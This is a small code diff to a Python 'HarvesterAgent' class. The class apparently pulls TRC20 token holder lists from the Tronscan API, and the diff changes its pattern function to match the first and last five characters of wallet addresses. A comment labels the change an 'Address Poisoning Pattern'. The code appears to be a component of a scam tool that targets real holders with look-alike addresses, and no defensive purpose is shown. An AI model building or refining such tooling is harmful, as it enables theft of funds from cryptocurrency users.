@@ -22,7 +22,8 @@ class HarvesterAgent(BaseAgent):
         return not any(char in self.exclusion_chars for char in pattern_parts)
 
     def get_pattern(self, address):
-        return f"{address[1:5]}*{address[-5:]}"
+        # Module 4: Address Poisoning Pattern (1st 5 and Last 5)
+        return f"{address[:5]}*{address[-5:]}"
 
     def fetch_holders(self):
         url = "https://apilist.tronscanapi.com/api/token_trc20/holders"
